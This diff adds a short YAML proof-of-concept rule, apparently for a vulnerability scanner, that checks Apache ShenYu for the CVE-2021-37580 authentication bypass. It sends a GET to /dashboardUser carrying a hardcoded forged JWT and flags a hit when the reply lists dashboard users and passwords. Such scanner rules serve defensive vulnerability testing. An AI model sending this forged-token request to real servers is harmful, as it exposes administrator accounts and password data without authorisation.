@@ -1,0 +1,20 @@
+name: poc-yaml-Apache-ShenYu-Unauthorized
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /dashboardUser
+            headers: 
+              "X-Access-Token": eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiZXhwIjoxNjQ4NjMwODc5fQ.RJbZoUJuHryl0DGb7A53HxdEZWRaFSnhLueYQhFKD9k
+            follow_redirects: false
+        expression: |
+            response.status == 200 && response.body.bcontains(b'query dashboard users success') && response.body.bcontains(b'password')
+expression: r0()
+
+detail:
+    author: marmot
+    links: 
+     - "https://github.com/rabbitsafe/CVE-2021-37580"
